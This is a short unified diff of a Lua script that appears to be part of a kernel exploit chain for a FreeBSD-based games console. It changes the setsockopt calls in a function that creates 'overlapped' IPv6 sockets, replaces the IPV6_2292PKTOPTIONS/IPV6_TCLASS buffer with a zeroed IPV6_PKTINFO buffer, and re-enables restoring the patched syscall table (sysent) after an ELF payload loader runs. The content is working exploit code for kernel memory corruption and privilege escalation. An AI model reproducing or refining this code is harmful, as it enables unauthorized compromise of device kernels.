@@ -8,8 +8,6 @@ local MAP_ANON_PRIVATE_FIXED = 0x1012
 
 local IPPROTO_IPV6        = 41
 local IPV6_PKTINFO        = 46
-local IPV6_2292PKTOPTIONS = 25
-local IPV6_TCLASS         = 61
 local AF_INET6    = 28
 local SOCK_DGRAM  = 2
 local IPPROTO_UDP = 17
@@ -221,14 +219,9 @@ local function create_overlapped_sockets()
     local ms = create_socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
     local vs = create_socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
 
-    local mbuf = malloc(24)
-    write32(mbuf,        20)
-    write32(mbuf + 0x04, IPPROTO_IPV6)
-    write32(mbuf + 0x08, IPV6_TCLASS)
-    write32(mbuf + 0x0C, 0)
-    write32(mbuf + 0x10, 0)
-    write32(mbuf + 0x14, 0)
-    syscall.setsockopt(ms, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, mbuf, 24)
+    local mbuf = malloc(20)
+    for i = 0, 4 do write32(mbuf + i * 4, 0) end
+    syscall.setsockopt(ms, IPPROTO_IPV6, IPV6_PKTINFO, mbuf, 20)
 
     local vbuf = malloc(20)
     for i = 0, 4 do write32(vbuf + i * 4, 0) end
@@ -353,8 +346,8 @@ function load_elfldr()
         ulog("payloadout=" .. to_hex(read32(payloadout)))
     end)
 
-    --restore_sysent(saved)
-    --ulog("sysent restored")
+    restore_sysent(saved)
+    ulog("sysent restored")
 
     if not ok then
         ulog("[elf] ERROR: " .. tostring(err))
